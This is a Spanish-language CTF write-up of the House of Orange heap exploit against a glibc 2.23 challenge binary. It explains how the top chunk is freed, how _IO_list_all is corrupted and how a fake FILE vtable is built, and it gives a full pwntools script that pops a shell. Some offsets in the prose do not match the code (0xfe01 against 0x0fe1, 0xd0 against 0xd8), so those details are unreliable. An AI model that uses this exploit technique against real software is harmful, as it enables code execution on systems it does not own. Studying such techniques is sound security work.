# House Of Orange
```
  Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
    Debuginfo:  Yes
```

Tal y como en `House of Force` hay un heap overflow que nos permite sobreescribir el top chunk. Esta vez las asignaciones con malloc no son de tamaño arbitrario. La version de glibc es 2.23 asi que podemos implementar la tecnica clasica que da nombre al reto.

Pasos:
1. Hacemos un "alloc (small)" y sobreescribimos con el overflow en este chunk en campo size del top chunk para que contenga un valor menor al espacio solicitado en un "alloc (large)". El nuevo tamaño que usamos, `0xfe01`, cumple ciertas condiciones necesarias:

    |                                                              |                                      |                  
    |--------------------------------------------------------------|--------------------------------------|
    | ((unsigned long) (old_size) >= MINSIZE                       | Debe ser al menos 0x20 bytes         |
    |  prev_inuse (old_top)                                        | Debe tener el byte PREV_INUSE activo |
    | ((unsigned long) old_end & (pagesize: 1)) == 0              | La direccion de top_chunk + size debe estar alineado a la pagina: (top_chunkaddr + size) & 0xfff == 0) |

2. Hacemos un "alloc (large)". Esto provoca que el top chunk se libere y vaya a `unsortedbin`.
3. Sobreescribimos de nuevo el top chunk:
  + Cambiamos su campo size a 0x61.
  + Cambiamos su campo bk a `_IO_list_all` - 0x10.
  + Creamos una estructura _IO_FILE_plus falsa con algunos valores especificos:

| Dirección relativa             | Descripción                                                                 |
|-------------------------------|------------------------------------------------------------------------------|
| top chunk                     | Cadena "/bin/sh\x00"                                                        |
| top chunk + 0x08              | Valor 0x61                                                                  |
| top chunk + 0x18              | Dirección de `_IO_list_all - 0x10`                                          |
| top chunk + 0x20              | Campo `_IO_write_base = 2`                                                  |
| top chunk + 0x28              | Campo `_IO_write_ptr = 3`                                                   |
| top chunk + 0x68              | Entrada falsa de vtable                                                     |
| top chunk + 0x70              | Entrada falsa de vtable                                                     |
| top chunk + 0x78              | Entrada falsa de vtable                                                     |
| top chunk + 0x80              | Dirección de `system`                                                       |
| top chunk + 0xc0              | Campo `_mode = 0`                                                            |
| top chunk + 0xd0              | Campo `vtable = top chunk + 0x68`                                           |

4. Hacemos un "alloc (small)" que realiza varias cosas:
  + Dado que hay un chunk en `unsortedbin` y se reserva un chunk pequeño malloc intenta moverlo a una `smallbin`, especificamente a `smallbin[4]`, que contiene los chunks de tamaño 0x5a-0x62 bytes.
  + Al ocurrir el *unlinking* parcial en `unsortedbin`: `p->bk->fd = p->fd` o lo que es lo mismo `_IO_list_all - 0x10 + 0x10 = main_arena + 88`. 
  ```
  /* Cabe destacar que p->fd puede contener cualquier cosa porque cuando malloc intenta satisfacer una solicitud dividiendo
     este chunk libre el valor en chunk->bk->fd se sobrescribe con la dirección de la unsortedbin */

  /* Ahora el primer elemento de la lista de file streams es esa direccion de libc, necesitamos que su campo `_chain`, es decir,
 `main_arena + 88 + 0x68`, sea igual a la direccion de nuestro top chunk. */
 
  /* Al haber colocado el top chunk en `smallbin[4]` y ser el unico elemento entonces `smallbin[4]` (que es la misma direccion que `main_arena + 88 + 0x68`)
  contiene la direccion de nuestro chunk. Ya tenemos nuestra estructura en la cadena de file streams. */
 ```
  + Realiza verificaciones de sanidad sobre nuestro chunk, falla y llama a `abort()` que limpia todos buffers de los punteros FILE por medio de invocar a ` _IO_flush_all_lockp`, que al final llama a `_IO_OVERFLOW`.
 ```
  /* IO_OVERFLOW es el cuarto elemento de la vtable a la que apunta un file stream (lo reemplazamos por system en nuestra vtable falsa) y toma como argumento
  la direccion del file stream, de modo que IO_OVERFLOW(top_chunk_addr) acaba siendo system("/bin/sh\x00") */

  /* No obstante IO_OVERFLOW es llamado si se cumplen estas condiciones:
   * fp->_mode <= 0 && 
   * fp->_IO_write_ptr > fp->_IO_write_base
   Que ya satisficimos. */
 ```

## Exploit 

``` py
from pwn import *
r = process("./house_of_orange")
libc = ELF("./libc.so.6")

r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip().ljust(8,b"\x00"),16) - 0x675a0

r.recvuntil(b"@ ")
heap_base = int(r.recv(14).strip().ljust(8,b"\x00"),16)

# Phase 1: Put the top chunk in the unsorted bin
r.sendlineafter(b">",b"1")
r.sendlineafter(b">",b"3")
r.sendlineafter(b"data:",b"A" * 16 + p64(0) + p64(0x0fe1))
r.sendlineafter(b">",b"2")

# Phase 2: Modify the size of the top chunk to make it fit in smallbin[4]
#          Modify the top chunk bk pointer in unsorted bin to overwrite _IO_list_all with a main_arena relative address
#          Craft a fake FILE struct 

# 0x20: _IO_write_base = 2
# 0x28: _IO_write_ptr = 3
# 0x68: fake vtable
# 0xc0: _mode = 0
# 0xd8: vtable = top_chunk_address + 0x68

r.sendlineafter(b">",b"3")
payload = flat({
    0x0: [b"/bin/sh\x00", p64(0x61),
          p64(0), p64(libc.symbols['_IO_list_all'] - 0x10),
          p64(2), p64(3)],                                          
    0x68: [p64(0) * 3, p64(libc.symbols['system'])],      
    0xc0: [p64(0)],                             
    0xd8: [p64(heap_base + 0x20 + 0x68)],
    },filler="b\x00")
r.sendlineafter(b"data:", b"A" * 16 + payload)

# Phase 3: Trigger abort()
r.sendlineafter(b">",b"1")
r.interactive()
```

     
